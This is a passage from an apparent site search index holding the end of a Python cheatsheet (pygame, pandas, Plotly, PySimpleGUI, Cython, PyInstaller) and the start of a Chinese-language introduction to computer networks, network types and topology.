pixel.\n&lt;Surf&gt;.blit(&lt;Surf&gt;, (x, y))                     # Draws passed surface to the surface.\n</code></pre> <pre><code>from pygame.transform import scale, ...\n&lt;Surf&gt; = scale(&lt;Surf&gt;, (width, height))         # Returns scaled surface.\n&lt;Surf&gt; = rotate(&lt;Surf&gt;, degrees)                # Returns rotated and scaled surface.\n&lt;Surf&gt; = flip(&lt;Surf&gt;, x_bool, y_bool)           # Returns flipped surface.\n</code></pre> <pre><code>from pygame.draw import line, ...\nline(&lt;Surf&gt;, color, (x1, y1), (x2, y2), width)  # Draws a line to the surface.\narc(&lt;Surf&gt;, color, &lt;Rect&gt;, from_rad, to_rad)    # Also: ellipse(&lt;Surf&gt;, color, &lt;Rect&gt;, width=0)\nrect(&lt;Surf&gt;, color, &lt;Rect&gt;, width=0)            # Also: polygon(&lt;Surf&gt;, color, points, width=0)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#font","title":"Font","text":"<pre><code>&lt;Font&gt; = pg.font.SysFont('&lt;name&gt;', size)        # Loads the system font or default if missing.\n&lt;Font&gt; = pg.font.Font('&lt;path&gt;', size)           # Loads the TTF file. Pass None for default.\n&lt;Surf&gt; = &lt;Font&gt;.render(text, antialias, color)  # Background color can be specified at the end.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#sound","title":"Sound","text":"<pre><code>&lt;Sound&gt; = pg.mixer.Sound('&lt;path&gt;')              # Loads the WAV file.\n&lt;Sound&gt;.play()                                  # Starts playing the sound.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#basic-mario-brothers-example","title":"Basic Mario Brothers Example","text":"<pre><code>import collections, dataclasses, enum, io, itertools as it, pygame as pg, urllib.request\nfrom random import randint\n\nP = collections.namedtuple('P', 'x y')          # Position\nD = enum.Enum('D', 'n e s w')                   # Direction\nW, H, MAX_S = 50, 50, P(5, 10)                  # Width, Height, Max speed\n\ndef main():\n    def get_screen():\n        pg.init()\n        return pg.display.set_mode((W*16, H*16))\n    def get_images():\n        url = 'https://gto76.github.io/python-cheatsheet/web/mario_bros.png'\n        img = pg.image.load(io.BytesIO(urllib.request.urlopen(url).read()))\n        return [img.subsurface(get_rect(x, 0)) for x in range(img.get_width() // 16)]\n    def get_mario():\n        Mario = dataclasses.make_dataclass('Mario', 'rect spd facing_left frame_cycle'.split())\n        return Mario(get_rect(1, 1), P(0, 0), False, it.cycle(range(3)))\n    def get_tiles():\n        border = [(x, y) for x in range(W) for y in range(H) if x in [0, W-1] or y in [0, H-1]]\n        platforms = [(randint(1, W-2), randint(2, H-2)) for _ in range(W*H // 10)]\n        return [get_rect(x, y) for x, y in border + platforms]\n    def get_rect(x, y):\n        return pg.Rect(x*16, y*16, 16, 16)\n    run(get_screen(), get_images(), get_mario(), get_tiles())\n\ndef run(screen, images, mario, tiles):\n    clock = pg.time.Clock()\n    while all(event.type != pg.QUIT for event in pg.event.get()):\n        keys = {pg.K_UP: D.n, pg.K_RIGHT: D.e, pg.K_DOWN: D.s, pg.K_LEFT: D.w}\n        pressed = {keys.get(ch) for ch, is_prsd in enumerate(pg.key.get_pressed()) if is_prsd}\n        update_speed(mario, tiles, pressed)\n        update_position(mario, tiles)\n        draw(screen, images, mario, tiles, pressed)\n        clock.tick(28)\n\ndef update_speed(mario, tiles, pressed):\n    x, y = mario.spd\n    x += 2 * ((D.e in pressed) - (D.w in pressed))\n    x -= (x &gt; 0) - (x &lt; 0)\n    y += 1 if D.s not in get_boundaries(mario.rect, tiles) else (D.n in pressed) * -10\n    mario.spd = P(x=max(-MAX_S.x, min(MAX_S.x, x)), y=max(-MAX_S.y, min(MAX_S.y, y)))\n\ndef update_position(mario, tiles):\n    x, y = mario.rect.topleft\n    n_steps = max(abs(s) for s in mario.spd)\n    for _ in range(n_steps):\n        mario.spd = stop_on_collision(mario.spd, get_boundaries(mario.rect, tiles))\n        x, y = x + mario.spd.x / n_steps, y + mario.spd.y / n_steps\n        mario.rect.topleft = x, y\n\ndef get_boundaries(rect, tiles):\n    deltas = {D.n: P(0, -1), D.e: P(1, 0), D.s: P(0, 1), D.w: P(-1, 0)}\n    return {d for d, delta in deltas.items() if rect.move(delta).collidelist(tiles) != -1}\n\ndef stop_on_collision(spd, bounds):\n    return P(x=0 if (D.w in bounds and spd.x &lt; 0) or (D.e in bounds and spd.x &gt; 0) else spd.x,\n             y=0 if (D.n in bounds and spd.y &lt; 0) or (D.s in bounds and spd.y &gt; 0) else spd.y)\n\ndef draw(screen, images, mario, tiles, pressed):\n    def get_marios_image_index():\n        if D.s not in get_boundaries(mario.rect, tiles):\n            return 4\n        return next(mario.frame_cycle) if {D.w, D.e} &amp; pressed else 6\n    screen.fill((85, 168, 255))\n    mario.facing_left = (D.w in pressed) if {D.w, D.e} &amp; pressed else mario.facing_left\n    screen.blit(images[get_marios_image_index() + mario.facing_left * 9], mario.rect)\n    for t in tiles:\n        screen.blit(images[18 if t.x in [0, (W-1)*16] or t.y in [0, (H-1)*16] else 19], t)\n    pg.display.flip()\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#pandas","title":"Pandas","text":"<pre><code># $ pip3 install pandas\nimport pandas as pd\nfrom pandas import Series, DataFrame\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#series","title":"Series","text":"<p>Ordered dictionary with a name.</p> <pre><code>&gt;&gt;&gt; Series([1, 2], index=['x', 'y'], name='a')\nx    1\ny    2\nName: a, dtype: int64\n</code></pre> <pre><code>&lt;Sr&gt; = Series(&lt;list&gt;)                         # Assigns RangeIndex starting at 0.\n&lt;Sr&gt; = Series(&lt;dict&gt;)                         # Takes dictionary's keys for index.\n&lt;Sr&gt; = Series(&lt;dict/Series&gt;, index=&lt;list&gt;)    # Only keeps items with keys specified in index.\n</code></pre> <pre><code>&lt;el&gt; = &lt;Sr&gt;.loc[key]                          # Or: &lt;Sr&gt;.iloc[index]\n&lt;Sr&gt; = &lt;Sr&gt;.loc[keys]                         # Or: &lt;Sr&gt;.iloc[indexes]\n&lt;Sr&gt; = &lt;Sr&gt;.loc[from_key : to_key_inclusive]  # Or: &lt;Sr&gt;.iloc[from_i : to_i_exclusive]\n</code></pre> <pre><code>&lt;el&gt; = &lt;Sr&gt;[key/index]                        # Or: &lt;Sr&gt;.key\n&lt;Sr&gt; = &lt;Sr&gt;[keys/indexes]                     # Or: &lt;Sr&gt;[&lt;key_range/range&gt;]\n&lt;Sr&gt; = &lt;Sr&gt;[bools]                            # Or: &lt;Sr&gt;.i/loc[bools]\n</code></pre> <pre><code>&lt;Sr&gt; = &lt;Sr&gt; &gt;&lt;== &lt;el/Sr&gt;                      # Returns a Series of bools.\n&lt;Sr&gt; = &lt;Sr&gt; +-*/ &lt;el/Sr&gt;                      # Items with non-matching keys get value NaN.\n</code></pre> <pre><code>&lt;Sr&gt; = &lt;Sr&gt;.append(&lt;Sr&gt;)                      # Or: pd.concat(&lt;coll_of_Sr&gt;)\n&lt;Sr&gt; = &lt;Sr&gt;.combine_first(&lt;Sr&gt;)               # Adds items that are not yet present.\n&lt;Sr&gt;.update(&lt;Sr&gt;)                             # Updates items that are already present.\n</code></pre> <pre><code>&lt;Sr&gt;.plot.line/area/bar/pie/hist()            # Generates a Matplotlib plot.\nmatplotlib.pyplot.show()                      # Displays the plot. Also savefig(&lt;path&gt;).\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#series-aggregate-transform-map","title":"Series \u2014 Aggregate, Transform, Map:","text":"<pre><code>&lt;el&gt; = &lt;Sr&gt;.sum/max/mean/idxmax/all()         # Or: &lt;Sr&gt;.agg(lambda &lt;Sr&gt;: &lt;el&gt;)\n&lt;Sr&gt; = &lt;Sr&gt;.rank/diff/cumsum/ffill/interpl()  # Or: &lt;Sr&gt;.agg/transform(lambda &lt;Sr&gt;: &lt;Sr&gt;)\n&lt;Sr&gt; = &lt;Sr&gt;.fillna(&lt;el&gt;)                      # Or: &lt;Sr&gt;.agg/transform/map(lambda &lt;el&gt;: &lt;el&gt;)\n</code></pre> <pre><code>&gt;&gt;&gt; sr = Series([1, 2], index=['x', 'y'])\nx    1\ny    2\n</code></pre> <pre><code>+-----------------+-------------+-------------+---------------+\n|                 |    'sum'    |   ['sum']   | {'s': 'sum'}  |\n+-----------------+-------------+-------------+---------------+\n| sr.apply(\u2026)     |      3      |    sum  3   |     s  3      |\n| sr.agg(\u2026)       |             |             |               |\n+-----------------+-------------+-------------+---------------+\n</code></pre> <pre><code>+-----------------+-------------+-------------+---------------+\n|                 |    'rank'   |   ['rank']  | {'r': 'rank'} |\n+-----------------+-------------+-------------+---------------+\n| sr.apply(\u2026)     |             |      rank   |               |\n| sr.agg(\u2026)       |     x  1    |   x     1   |    r  x  1    |\n| sr.transform(\u2026) |     y  2    |   y     2   |       y  2    |\n+-----------------+-------------+-------------+---------------+\n</code></pre> <ul> <li>Last result has a hierarchical index. Use <code>'&lt;Sr&gt;[key_1, key_2]'</code> to get its values.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dataframe","title":"DataFrame","text":"<p>Table with labeled rows and columns.</p> <pre><code>&gt;&gt;&gt; DataFrame([[1, 2], [3, 4]], index=['a', 'b'], columns=['x', 'y'])\n   x  y\na  1  2\nb  3  4\n</code></pre> <pre><code>&lt;DF&gt;    = DataFrame(&lt;list_of_rows&gt;)           # Rows can be either lists, dicts or series.\n&lt;DF&gt;    = DataFrame(&lt;dict_of_columns&gt;)        # Columns can be either lists, dicts or series.\n</code></pre> <pre><code>&lt;el&gt;    = &lt;DF&gt;.loc[row_key, column_key]       # Or: &lt;DF&gt;.iloc[row_index, column_index]\n&lt;Sr/DF&gt; = &lt;DF&gt;.loc[row_key/s]                 # Or: &lt;DF&gt;.iloc[row_index/es]\n&lt;Sr/DF&gt; = &lt;DF&gt;.loc[:, column_key/s]           # Or: &lt;DF&gt;.iloc[:, column_index/es]\n&lt;DF&gt;    = &lt;DF&gt;.loc[row_bools, column_bools]   # Or: &lt;DF&gt;.iloc[row_bools, column_bools]\n</code></pre> <pre><code>&lt;Sr/DF&gt; = &lt;DF&gt;[column_key/s]                  # Or: &lt;DF&gt;.column_key\n&lt;DF&gt;    = &lt;DF&gt;[row_bools]                     # Keeps rows as specified by bools.\n&lt;DF&gt;    = &lt;DF&gt;[&lt;DF_of_bools&gt;]                 # Assigns NaN to False values.\n</code></pre> <pre><code>&lt;DF&gt;    = &lt;DF&gt; &gt;&lt;== &lt;el/Sr/DF&gt;                # Returns DF of bools. Sr is treated as a row.\n&lt;DF&gt;    = &lt;DF&gt; +-*/ &lt;el/Sr/DF&gt;                # Items with non-matching keys get value NaN.\n</code></pre> <pre><code>&lt;DF&gt;    = &lt;DF&gt;.set_index(column_key)          # Replaces row keys with values from a column.\n&lt;DF&gt;    = &lt;DF&gt;.reset_index()                  # Moves row keys to a column named index.\n&lt;DF&gt;    = &lt;DF&gt;.sort_index(ascending=True)     # Sorts rows by row keys.\n&lt;DF&gt;    = &lt;DF&gt;.sort_values(column_key/s)      # Sorts rows by the passed column/s.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dataframe-merge-join-concat","title":"DataFrame \u2014 Merge, Join, Concat:","text":"<pre><code>&gt;&gt;&gt; l = DataFrame([[1, 2], [3, 4]], index=['a', 'b'], columns=['x', 'y'])\n   x  y\na  1  2\nb  3  4\n&gt;&gt;&gt; r = DataFrame([[4, 5], [6, 7]], index=['b', 'c'], columns=['y', 'z'])\n   y  z\nb  4  5\nc  6  7\n</code></pre> <pre><code>+------------------------+---------------+------------+------------+--------------------------+\n|                        |    'outer'    |   'inner'  |   'left'   |       Description        |\n+------------------------+---------------+------------+------------+--------------------------+\n| l.merge(r, on='y',     |    x   y   z  | x   y   z  | x   y   z  | Joins/merges on column.  |\n|            how=\u2026)      | 0  1   2   .  | 3   4   5  | 1   2   .  | Also accepts left_on and |\n|                        | 1  3   4   5  |            | 3   4   5  | right_on parameters.     |\n|                        | 2  .   6   7  |            |            | Uses 'inner' by default. |\n+------------------------+---------------+------------+------------+--------------------------+\n| l.join(r, lsuffix='l', |    x yl yr  z |            | x yl yr  z | Joins/merges on row keys.|\n|           rsuffix='r', | a  1  2  .  . | x yl yr  z | 1  2  .  . | Uses 'left' by default.  |\n|           how=\u2026)       | b  3  4  4  5 | 3  4  4  5 | 3  4  4  5 | If r is a series, it is  |\n|                        | c  .  .  6  7 |            |            | treated as a column.     |\n+------------------------+---------------+------------+------------+--------------------------+\n| pd.concat([l, r],      |    x   y   z  |     y      |            | Adds rows at the bottom. |\n|           axis=0,      | a  1   2   .  |     2      |            | Uses 'outer' by default. |\n|           join=\u2026)      | b  3   4   .  |     4      |            | A series is treated as a |\n|                        | b  .   4   5  |     4      |            | column. Use l.append(sr) |\n|                        | c  .   6   7  |     6      |            | to add a row instead.    |\n+------------------------+---------------+------------+------------+--------------------------+\n| pd.concat([l, r],      |    x  y  y  z |            |            | Adds columns at the      |\n|           axis=1,      | a  1  2  .  . | x  y  y  z |            | right end. Uses 'outer'  |\n|           join=\u2026)      | b  3  4  4  5 | 3  4  4  5 |            | by default. A series is  |\n|                        | c  .  .  6  7 |            |            | treated as a column.     |\n+------------------------+---------------+------------+------------+--------------------------+\n| l.combine_first(r)     |    x   y   z  |            |            | Adds missing rows and    |\n|                        | a  1   2   .  |            |            | columns. Also updates    |\n|                        | b  3   4   5  |            |            | items that contain NaN.  |\n|                        | c  .   6   7  |            |            | R must be a DataFrame.   |\n+------------------------+---------------+------------+------------+--------------------------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dataframe-aggregate-transform-map","title":"DataFrame \u2014 Aggregate, Transform, Map:","text":"<pre><code>&lt;Sr&gt; = &lt;DF&gt;.sum/max/mean/idxmax/all()         # Or: &lt;DF&gt;.apply/agg(lambda &lt;Sr&gt;: &lt;el&gt;)\n&lt;DF&gt; = &lt;DF&gt;.rank/diff/cumsum/ffill/interpl()  # Or: &lt;DF&gt;.apply/agg/transform(lambda &lt;Sr&gt;: &lt;Sr&gt;)\n&lt;DF&gt; = &lt;DF&gt;.fillna(&lt;el&gt;)                      # Or: &lt;DF&gt;.applymap(lambda &lt;el&gt;: &lt;el&gt;)\n</code></pre> <ul> <li>All operations operate on columns by default. Pass <code>'axis=1'</code> to process the rows instead.</li> </ul> <pre><code>&gt;&gt;&gt; df = DataFrame([[1, 2], [3, 4]], index=['a', 'b'], columns=['x', 'y'])\n   x  y\na  1  2\nb  3  4\n</code></pre> <pre><code>+-----------------+-------------+-------------+---------------+\n|                 |    'sum'    |   ['sum']   | {'x': 'sum'}  |\n+-----------------+-------------+-------------+---------------+\n| df.apply(\u2026)     |             |       x  y  |               |\n| df.agg(\u2026)       |     x  4    |  sum  4  6  |     x  4      |\n|                 |     y  6    |             |               |\n+-----------------+-------------+-------------+---------------+\n</code></pre> <pre><code>+-----------------+-------------+-------------+---------------+\n|                 |    'rank'   |   ['rank']  | {'x': 'rank'} |\n+-----------------+-------------+-------------+---------------+\n| df.apply(\u2026)     |      x  y   |      x    y |        x      |\n| df.agg(\u2026)       |   a  1  1   |   rank rank |     a  1      |\n| df.transform(\u2026) |   b  2  2   | a    1    1 |     b  2      |\n|                 |             | b    2    2 |               |\n+-----------------+-------------+-------------+---------------+\n</code></pre> <ul> <li>Use <code>'&lt;DF&gt;[col_key_1, col_key_2][row_key]'</code> to get the fifth result's values.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dataframe-plot-encode-decode","title":"DataFrame \u2014 Plot, Encode, Decode:","text":"<pre><code>import matplotlib.pyplot as plt\n&lt;DF&gt;.plot.line/bar/hist/scatter([x=column_key, y=column_key/s]); plt.show()\n</code></pre> <pre><code>&lt;DF&gt; = pd.read_json/html('&lt;str/path/url&gt;')\n&lt;DF&gt; = pd.read_csv/pickle/excel('&lt;path/url&gt;')\n&lt;DF&gt; = pd.read_sql('&lt;table_name/query&gt;', &lt;connection&gt;)\n&lt;DF&gt; = pd.read_clipboard()\n</code></pre> <pre><code>&lt;dict&gt; = &lt;DF&gt;.to_dict(['d/l/s/sp/r/i'])\n&lt;str&gt;  = &lt;DF&gt;.to_json/html/csv/markdown/latex([&lt;path&gt;])\n&lt;DF&gt;.to_pickle/excel(&lt;path&gt;)\n&lt;DF&gt;.to_sql('&lt;table_name&gt;', &lt;connection&gt;)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#groupby","title":"GroupBy","text":"<p>Object that groups together rows of a dataframe based on the value of the passed column.</p> <pre><code>&gt;&gt;&gt; df = DataFrame([[1, 2, 3], [4, 5, 6], [7, 8, 6]], index=list('abc'), columns=list('xyz'))\n&gt;&gt;&gt; df.groupby('z').get_group(6)\n   x  y\nb  4  5\nc  7  8\n</code></pre> <pre><code>&lt;GB&gt; = &lt;DF&gt;.groupby(column_key/s)             # DF is split into groups based on passed column.\n&lt;DF&gt; = &lt;GB&gt;.apply(&lt;func&gt;)                     # Maps each group. Func can return DF, Sr or el.\n&lt;GB&gt; = &lt;GB&gt;[column_key]                       # A single column GB. All operations return a Sr.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#groupby-aggregate-transform-map","title":"GroupBy \u2014 Aggregate, Transform, Map:","text":"<pre><code>&lt;DF&gt; = &lt;GB&gt;.sum/max/mean/idxmax/all()         # Or: &lt;GB&gt;.agg(lambda &lt;Sr&gt;: &lt;el&gt;)\n&lt;DF&gt; = &lt;GB&gt;.rank/diff/cumsum/ffill()          # Or: &lt;GB&gt;.transform(lambda &lt;Sr&gt;: &lt;Sr&gt;)\n&lt;DF&gt; = &lt;GB&gt;.fillna(&lt;el&gt;)                      # Or: &lt;GB&gt;.transform(lambda &lt;Sr&gt;: &lt;Sr&gt;)\n</code></pre> <pre><code>&gt;&gt;&gt; gb = df.groupby('z')\n      x  y  z\n3: a  1  2  3\n6: b  4  5  6\n   c  7  8  6\n</code></pre> <pre><code>+-----------------+-------------+-------------+-------------+---------------+\n|                 |    'sum'    |    'rank'   |   ['rank']  | {'x': 'rank'} |\n+-----------------+-------------+-------------+-------------+---------------+\n| gb.agg(\u2026)       |      x   y  |      x  y   |      x    y |        x      |\n|                 |  z          |   a  1  1   |   rank rank |     a  1      |\n|                 |  3   1   2  |   b  1  1   | a    1    1 |     b  1      |\n|                 |  6  11  13  |   c  2  2   | b    1    1 |     c  2      |\n|                 |             |             | c    2    2 |               |\n+-----------------+-------------+-------------+-------------+---------------+\n| gb.transform(\u2026) |      x   y  |      x  y   |             |               |\n|                 |  a   1   2  |   a  1  1   |             |               |\n|                 |  b  11  13  |   b  1  1   |             |               |\n|                 |  c  11  13  |   c  2  2   |             |               |\n+-----------------+-------------+-------------+-------------+---------------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#rolling","title":"Rolling","text":"<p>Object for rolling window calculations.</p> <pre><code>&lt;R_Sr/R_DF/R_GB&gt; = &lt;Sr/DF/GB&gt;.rolling(window_size)  # Also: `min_periods=None, center=False`.\n&lt;R_Sr/R_DF&gt;      = &lt;R_DF/R_GB&gt;[column_key/s]        # Or: &lt;R&gt;.column_key\n&lt;Sr/DF/DF&gt;       = &lt;R_Sr/R_DF/R_GB&gt;.sum/max/mean()  # Or: &lt;R&gt;.apply/agg(&lt;agg_func/str&gt;)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#plotly","title":"Plotly","text":"<pre><code># $ pip3 install plotly kaleido\nfrom plotly.express import line\n&lt;Figure&gt; = line(&lt;DF&gt;, x=&lt;col_name&gt;, y=&lt;col_name&gt;)        # Or: line(x=&lt;list&gt;, y=&lt;list&gt;)\n&lt;Figure&gt;.update_layout(margin=dict(t=0, r=0, b=0, l=0))  # Or: paper_bgcolor='rgba(0, 0, 0, 0)'\n&lt;Figure&gt;.write_html/json/image('&lt;path&gt;')                 # Also: &lt;Figure&gt;.show()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#covid-deaths-by-continent","title":"Covid deaths by continent:","text":"<pre><code>covid = pd.read_csv('https://covid.ourworldindata.org/data/owid-covid-data.csv',\n                    usecols=['iso_code', 'date', 'total_deaths', 'population'])\ncontinents = pd.read_csv('https://gist.githubusercontent.com/stevewithington/20a69c0b6d2ff'\n                         '846ea5d35e5fc47f26c/raw/country-and-continent-codes-list-csv.csv',\n                         usecols=['Three_Letter_Country_Code', 'Continent_Name'])\ndf = pd.merge(covid, continents, left_on='iso_code', right_on='Three_Letter_Country_Code')\ndf = df.groupby(['Continent_Name', 'date']).sum().reset_index()\ndf['Total Deaths per Million'] = df.total_deaths * 1e6 / df.population\ndf = df[df.date &gt; '2020-03-14']\ndf = df.rename({'date': 'Date', 'Continent_Name': 'Continent'}, axis='columns')\nline(df, x='Date', y='Total Deaths per Million', color='Continent').show()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#confirmed-covid-cases-dow-jones-gold-and-bitcoin-price","title":"Confirmed covid cases, Dow Jones, Gold, and Bitcoin price:","text":"<pre><code>import pandas as pd\nimport plotly.graph_objects as go\n\ndef main():\n    display_data(wrangle_data(*scrape_data()))\n\ndef scrape_data():\n    def scrape_covid():\n        url = 'https://covid.ourworldindata.org/data/owid-covid-data.csv'\n        df = pd.read_csv(url, usecols=['location', 'date', 'total_cases'])\n        return df[df.location == 'World'].set_index('date').total_cases\n    def scrape_yahoo(slug):\n        url = f'https://query1.finance.yahoo.com/v7/finance/download/{slug}' + \\\n              '?period1=1579651200&amp;period2=9999999999&amp;interval=1d&amp;events=history'\n        df = pd.read_csv(url, usecols=['Date', 'Close'])\n        return df.set_index('Date').Close\n    out = scrape_covid(), scrape_yahoo('BTC-USD'), scrape_yahoo('GC=F'), scrape_yahoo('^DJI')\n    return map(pd.Series.rename, out, ['Total Cases', 'Bitcoin', 'Gold', 'Dow Jones'])\n\ndef wrangle_data(covid, bitcoin, gold, dow):\n    df = pd.concat([bitcoin, gold, dow], axis=1)  # Joins columns on dates.\n    df = df.sort_index().interpolate()            # Sorts by date and interpolates NaN-s.\n    df = df.loc['2020-02-23':]                    # Discards rows before '2020-02-23'.\n    df = (df / df.iloc[0]) * 100                  # Calculates percentages relative to day 1.\n    df = df.join(covid)                           # Adds column with covid cases.\n    return df.sort_values(df.index[-1], axis=1)   # Sorts columns by last day's value.\n\ndef display_data(df):\n    figure = go.Figure()\n    for col_name in reversed(df.columns):\n        yaxis = 'y1' if col_name == 'Total Cases' else 'y2'\n        trace = go.Scatter(x=df.index, y=df[col_name], name=col_name, yaxis=yaxis)\n        figure.add_trace(trace)\n    figure.update_layout(\n        yaxis1=dict(title='Total Cases', rangemode='tozero'),\n        yaxis2=dict(title='%', rangemode='tozero', overlaying='y', side='right'),\n        legend=dict(x=1.1),\n        height=450\n    ).show()\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#pysimplegui","title":"PySimpleGUI","text":"<pre><code># $ pip3 install PySimpleGUI\nimport PySimpleGUI as sg\nlayout = [[sg.Text(\"What's your name?\")], [sg.Input()], [sg.Button('Ok')]]\nwindow = sg.Window('Window Title', layout)\nevent, values = window.read()\nprint(f'Hello {values[0]}!' if event == 'Ok' else '')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#appendix","title":"Appendix","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#cython","title":"Cython","text":"<p>Library that compiles Python code into C.</p> <pre><code># $ pip3 install cython\nimport pyximport; pyximport.install()\nimport &lt;cython_script&gt;\n&lt;cython_script&gt;.main()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#definitions","title":"Definitions:","text":"<ul> <li>All <code>'cdef'</code> definitions are optional, but they contribute to the speed-up.</li> <li>Script needs to be saved with a <code>'pyx'</code> extension.</li> </ul> <pre><code>cdef &lt;ctype&gt; &lt;var_name&gt; = &lt;el&gt;\ncdef &lt;ctype&gt;[n_elements] &lt;var_name&gt; = [&lt;el_1&gt;, &lt;el_2&gt;, ...]\ncdef &lt;ctype/void&gt; &lt;func_name&gt;(&lt;ctype&gt; &lt;arg_name&gt;): ...\n</code></pre> <pre><code>cdef class &lt;class_name&gt;:\n    cdef public &lt;ctype&gt; &lt;attr_name&gt;\n    def __init__(self, &lt;ctype&gt; &lt;arg_name&gt;):\n        self.&lt;attr_name&gt; = &lt;arg_name&gt;\n</code></pre> <pre><code>cdef enum &lt;enum_name&gt;: &lt;member_name_1&gt;, &lt;member_name_2&gt;, ...\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#pyinstaller","title":"PyInstaller","text":"<pre><code>$ pip3 install pyinstaller\n$ pyinstaller script.py                        # Compiles into './dist/script' directory.\n$ pyinstaller script.py --onefile              # Compiles into './dist/script' console app.\n$ pyinstaller script.py --windowed             # Compiles into './dist/script' windowed app.\n$ pyinstaller script.py --add-data '&lt;path&gt;:.'  # Adds file to the root of the executable.\n</code></pre> <ul> <li>File paths need to be updated to <code>'os.path.join(sys._MEIPASS, &lt;path&gt;)'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#basic-script-template","title":"Basic Script Template","text":"<pre><code>#!/usr/bin/env python3\n#\n# Usage: .py\n#\n\nfrom sys import argv, exit\nfrom collections import defaultdict, namedtuple\nfrom dataclasses import make_dataclass\nfrom enum import Enum\nimport functools as ft, itertools as it, operator as op, re\n\n\ndef main():\n    pass\n\n\n###\n##  UTIL\n#\n\ndef read_file(filename):\n    with open(filename, encoding='utf-8') as file:\n        return file.readlines()\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#index","title":"Index","text":"<ul> <li>Only available in the PDF.</li> <li>Ctrl+F / \u2318F is usually sufficient.</li> <li>Searching <code>'#&lt;title&gt;'</code> on the webpage will limit the search to the titles.</li> </ul>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/","title":"\u7f51\u7edc\u7b80\u4ecb","text":""},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_2","title":"\u7f51\u7edc\u6982\u8ff0","text":"<p>\u7f51\u7edc\u4f7f\u4e24\u53f0\u8ba1\u7b97\u673a\u80fd\u591f\u76f8\u4e92\u901a\u4fe1\u3002\u6709\u591a\u79cd\u62d3\u6251\u7ed3\u6784\uff08\u7f51\u72b6/\u6811\u5f62/\u661f\u5f62\uff09\u3001\u4ecb\u8d28\uff08\u4ee5\u592a\u7f51/\u5149\u7ea4/\u540c\u8f74\u7535\u7f06/\u65e0\u7ebf\uff09\u548c\u534f\u8bae\uff08TCP/UDP/IPX\uff09\u53ef\u7528\u4e8e\u7ec4\u6210\u7f51\u7edc\u3002\u4f5c\u4e3a\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u4e86\u89e3\u7f51\u7edc\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u5f53\u7f51\u7edc\u51fa\u73b0\u6545\u969c\u65f6\uff0c\u9519\u8bef\u53ef\u80fd\u662f\u65e0\u58f0\u7684\uff0c\u5bfc\u81f4\u6211\u4eec\u9519\u8fc7\u4e00\u4e9b\u4e1c\u897f\u3002</p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_3","title":"\u7f51\u7edc\u7ed3\u6784","text":""},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_4","title":"\u7f51\u7edc\u7c7b\u578b","text":"\u5e38\u7528\u672f\u8bed \u5b9a\u4e49 \u5e7f\u57df\u7f51(WAN) \u4e92\u8054\u7f51 \u5c40\u57df\u7f51(LAN) \u5185\u90e8\u7f51\u7edc(\u5bb6\u5ead\u5bbd\u5e26\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e92\u8054\u7f51\u65e0\u6cd5\u8bbf\u95ee\u5230) \u65e0\u7ebf\u5c40\u57df\u7f51(WLAN) \u53ef\u901a\u8fc7WI-FI\u8bbf\u95ee\u7684\u5185\u90e8\u7f51\u7edc \u865a\u62df\u4e13\u7528\u7f51\u7edc(VPN) \u5c06\u591a\u4e2a\u7f51\u7edc\u8fde\u63a5\u5230\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\uff0c\u5c31\u50cf\u5f00\u8f9f\u96a7\u9053\u4e00\u6837"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_5","title":"\u7f51\u7edc\u62d3\u6251","text":"<p>\u7f51\u7edc\u62d3\u6251\u53ef\u5212\u5206\u4e3a\u4e09\u90e8\u5206</p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#1","title":"1\u3001\u8fde\u63a5","text":"<code>\u6709\u7ebf\u8fde\u63a5</code> <code>\u65e0\u7ebf\u8fde\u63a5</code> \u540c\u8f74\u7535\u7f06 Wi-Fi \u5149\u7ea4 \u624b\u673a \u53cc\u7ede\u7ebf(\u6700\u5e38\u89c1\u7684\u7f51\u7ebf) \u536b\u661f \u5176\u4ed6 